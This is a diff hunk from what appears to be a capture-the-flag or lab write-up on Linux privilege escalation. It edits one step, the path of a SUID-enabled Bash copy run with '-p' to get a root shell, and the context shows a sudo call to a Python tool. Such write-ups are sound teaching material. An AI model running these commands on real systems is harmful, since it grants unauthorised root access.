@@ -397,7 +397,7 @@ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
 Finally, we execute our SUID-enabled Bash binary with the `-p` option:
 
 ```bash
-/bin/rootbash -p 
+/tmp/rootbash -p 
 ```
 
 And voila — **ROOT SHELL!**
